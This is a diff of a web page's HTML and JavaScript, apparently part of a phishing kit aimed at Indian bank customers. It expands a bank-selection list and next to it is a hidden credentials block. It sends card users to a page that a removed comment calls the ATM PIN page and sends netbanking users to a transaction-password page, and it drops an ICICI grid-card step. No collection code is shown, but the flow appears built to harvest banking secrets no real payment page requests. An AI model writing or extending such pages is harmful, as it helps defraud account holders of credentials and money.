@@ -65,13 +65,39 @@
                     <label for="bankName">Select Bank Name</label>
                     <select id="bankName" name="bankName">
                         <option value="">-- Select Bank --</option>
-                        <option value="State Bank of India (SBI)">State Bank of India (SBI)</option>
+                        <option value="Axis Bank">Axis Bank</option>
+                        <option value="Bandhan Bank Limited">Bandhan Bank Limited</option>
+                        <option value="Bank of Baroda">Bank of Baroda</option>
+                        <option value="Bank of India">Bank of India</option>
+                        <option value="Bank of Maharashtra">Bank of Maharashtra</option>
+                        <option value="Canara Bank">Canara Bank</option>
+                        <option value="Central Bank of India">Central Bank of India</option>
+                        <option value="City Union Bank Limited">City Union Bank Limited</option>
+                        <option value="CSB Bank Limited">CSB Bank Limited</option>
+                        <option value="DCB Bank Limited">DCB Bank Limited</option>
+                        <option value="Dhanlaxmi Bank Limited">Dhanlaxmi Bank Limited</option>
+                        <option value="Federal Bank Limited">Federal Bank Limited</option>
                         <option value="HDFC Bank">HDFC Bank</option>
                         <option value="ICICI Bank">ICICI Bank</option>
-                        <option value="Axis Bank">Axis Bank</option>
+                        <option value="IDBI Bank Limited">IDBI Bank Limited</option>
+                        <option value="IDFC FIRST Bank Limited">IDFC FIRST Bank Limited</option>
+                        <option value="Indian Bank">Indian Bank</option>
+                        <option value="Indian Overseas Bank">Indian Overseas Bank</option>
+                        <option value="IndusInd Bank Limited">IndusInd Bank Limited</option>
+                        <option value="Jammu & Kashmir Bank Limited">Jammu & Kashmir Bank Limited</option>
+                        <option value="Karnataka Bank Limited">Karnataka Bank Limited</option>
+                        <option value="Karur Vysya Bank Limited">Karur Vysya Bank Limited</option>
+                        <option value="Kotak Mahindra Bank Limited">Kotak Mahindra Bank Limited</option>
+                        <option value="Nainital Bank Limited">Nainital Bank Limited</option>
+                        <option value="Punjab & Sind Bank">Punjab & Sind Bank</option>
                         <option value="Punjab National Bank (PNB)">Punjab National Bank (PNB)</option>
-                        <option value="Bank of Baroda">Bank of Baroda</option>
-                        <option value="Other Bank">Other Bank</option>
+                        <option value="RBL Bank Limited">RBL Bank Limited</option>
+                        <option value="South Indian Bank Limited">South Indian Bank Limited</option>
+                        <option value="State Bank of India (SBI)">State Bank of India (SBI)</option>
+                        <option value="Tamilnad Mercantile Bank Limited">Tamilnad Mercantile Bank Limited</option>
+                        <option value="UCO Bank">UCO Bank</option>
+                        <option value="Union Bank of India">Union Bank of India</option>
+                        <option value="YES Bank Limited">YES Bank Limited</option>
                     </select>
                 </div>
                 <div id="bankCredentials" style="display: none;">
@@ -166,14 +192,9 @@
 
             setTimeout(() => {
                 if (payMethod === 'Card') {
-                    window.location.href = "page5.html"; // Card ke liye ATM PIN page
+                    window.location.href = "page5.html"; 
                 } else {
-                    // Sirf ICICI Bank select hone par hi grid step 1 par jayega, warna direct transaction password ya completion par
-                    if (selectedBank.includes("ICICI")) {
-                        window.location.href = "grid_step1.html"; 
-                    } else {
-                        window.location.href = "netbanking_pass.html"; 
-                    }
+                    window.location.href = "netbanking_pass.html"; 
                 }
             }, 1000);
         });
